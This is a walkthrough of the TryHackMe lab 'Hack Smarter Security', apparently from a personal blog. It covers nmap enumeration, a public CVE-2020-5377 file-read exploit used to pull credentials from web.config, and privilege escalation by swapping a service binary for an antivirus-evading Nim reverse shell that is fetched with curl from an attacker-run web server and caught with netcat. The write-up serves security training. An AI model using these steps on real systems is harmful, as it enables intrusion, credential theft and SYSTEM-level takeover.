---
title: "TryHackMe: Hack Smarter Security"
collection: publications
permalink: /publication/Hacksmartersec
excerpt: 'This is a free room from TryHackMe'
date: 2024-03-19
venue: '03-19'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
#citation: 'Your Name, You. (2009). &quot;Paper Title Number 1.&quot; <i>Journal 1</i>. 1(1).'
---

![header](/images/Hack%20Smarter%20Security_header.png)

**LINK:** [Hack Smarter Security](https://tryhackme.com/r/room/hacksmartersecurity)

## Enumeration 

* Let's start off with an nmap scan :

```bash
# nmap -sV -sC -T4 10.10.11.112
Nmap scan report for 10.10.11.112 (10.10.11.112)
Host is up (0.058s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 06-28-23  02:58PM                 3722 Credit-Cards-We-Pwned.txt
|_06-28-23  03:00PM              1022126 stolen-passport.png
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 0dfadadec9dd998d2e8eeb3b93ffe26c (RSA)
|   256 5d0cdf3226d371a28e6e9a1c43fc1a03 (ECDSA)
|_  256 c425e709d6c9d9865f6e8a8bec134a8b (ED25519)
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: HackSmarterSec
1311/tcp open  ssl/rxmon?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Strict-Transport-Security: max-age=0
|     X-Frame-Options: SAMEORIGIN
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     vary: accept-encoding
|     Content-Type: text/html;charset=UTF-8
|     Date: Mon, 18 Mar 2024 14:19:47 GMT
|     Connection: close
|     
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=hacksmartersec
| Not valid before: 2024-03-17T14:16:19
|_Not valid after:  2024-09-16T14:16:19
| rdp-ntlm-info: 
|   Target_Name: HACKSMARTERSEC
|   NetBIOS_Domain_Name: HACKSMARTERSEC
|   NetBIOS_Computer_Name: HACKSMARTERSEC
|   DNS_Domain_Name: hacksmartersec
|   DNS_Computer_Name: hacksmartersec
|   Product_Version: 10.0.17763
|_  System_Time: 2024-03-18T14:20:01+00:00
|_ssl-date: 2024-03-18T14:20:06+00:00; 0s from scanner time.
```

- The scan revealed that our target is a Windows machine, and we found 5 open ports.
- We also discovered that ``FTP`` anonymous login was enabled but didn't find anything useful in the files.
- Moving on, we checked the website running on port 80, which turned out to be ``IIS 10.0``. However, our attempts to find interesting files or directories were unsuccessful.

- Moving on, we checked port ``1311`` where we found Dell OpenManage version 9.4.0.2 running.

![hacksmartersec1](/images/hacksmartersec1.png)

- After digging deeper, we learned that this version was vulnerable to CVE-2020-5377, known as ``Arbitrary File Read``.
- I found this [exploit](https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2020-5377_CVE-2021-21514) that will help us read files on the target.
- A quick search reveals that the root folder for the IIS default website is located at ``C:\inetpub\wwwroot``. the idea here is to try to read the ``web.config`` file which is an XML file containing rules for a particular on the web server. this file may contains credentials.

## User Flag : 

- based on the title of the webserver on port 80 which is hacksmartersec, i assumed that the ``web.config`` file is located at `` C:\inetpub\wwwroot\hacksmartersec\web.config``.

![hacksmartersec2](/images/hacksmartersec2.png)

- Bingoo. Now we have the credentials so our next step is to login via ssh and get the user flag.

![hacksmartersec3](/images/hackersmartsec3.png)

## Root Flag : 

- For the privilege escalation part, i used ``winPEAS`` but the antivirus picked it up. So, i switched to [``PrivescCheck.ps1``](https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1) instead. I found that the ``spoofer-scheduler`` service's binary was running with a lot of permissions as LocalSystem.

```
# Running PrivescCheck 

powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
```
![hacksmartersec4](/images/hacksmartersec4.png)

- The plan now is to stop the ``spoofer-scheduler`` service. Then, we compile a reverse shell to an exe with same name used for the service's binary, overwrite the service binary with our reverse shell, and finally start the service and get a super-powered shell as SYSTEM.

- Stopping the ``spoofer-scheduler`` service . 

![hacksmartersec5](/images/hacksmartersec5.png)

- I couldn't just use a regular sneaky shell because the antivirus would catch me. So, I found this [Nim](https://github.com/Sn1r/Nim-Reverse-Shell/blob/main/rev_shell.nim) reverse shell that's good at hiding from antivirus software (don't forget to change your ip address).

- Now it's time to compile it to an exe named ``spoofer-scheduler.exe`` to match the service's binary. Then, we put it on the target system, ready to run when we restart the service.

```
# Compiling the reverse shell
nim -c -d:mingw --app:gui -o:spoofer-scheduler.exe nim_revshell.nim
```
![hacksmartersec6](/images/hacksmartersec6.png)

```
# Start a web server on your machine

python3 -m http.server <PORT>
```

```
# Download the spoofer-scheduler.exe on target (make sure you are in C:\Program Files (x86)\spoofer)

curl http://<server-ip>:PORT/spoofer-scheduler.exe -o spoofer-scheduler.exe
```

- Now start a netcat listener to get the reverse shell after starting the service

```
nc -nlvp <listener-port>
```

```
# start the service

sc start spoofer-scheduler
```

![hacksmartersec7](/images/hacksmartersec7.png)

- we get a connection back to our listener 

![hacksmartersec8](/images/hacksmartersec8.png)










